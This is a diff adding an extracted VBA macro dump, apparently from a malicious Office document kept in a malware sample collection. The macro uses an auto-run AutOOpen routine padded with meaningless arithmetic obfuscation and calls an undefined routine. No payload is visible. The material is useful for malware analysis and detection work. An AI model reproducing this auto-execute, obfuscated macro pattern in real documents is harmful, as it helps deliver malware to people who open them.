@@ -1,0 +1,22 @@
+Filename     : ./macros/5e7a1ed5f9a1fbc9d7148fbc28a379dc0067508844b6d342084d26b75c995d4f
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub AutOOpen()
+suzuki100 = 17 + 43
+suzuki100 = suzuki100 - 87 - 33 + suzuki10
+suzuki100 = 57 * 56 + suzuki100 + suzuki10
+domino1964
+suzuki100 = 49 * 83 - 77
+suzuki100 = 64 - 20 - 63 + suzuki100 + 2
+suzuki100 = 12 * 28
+End Sub
+
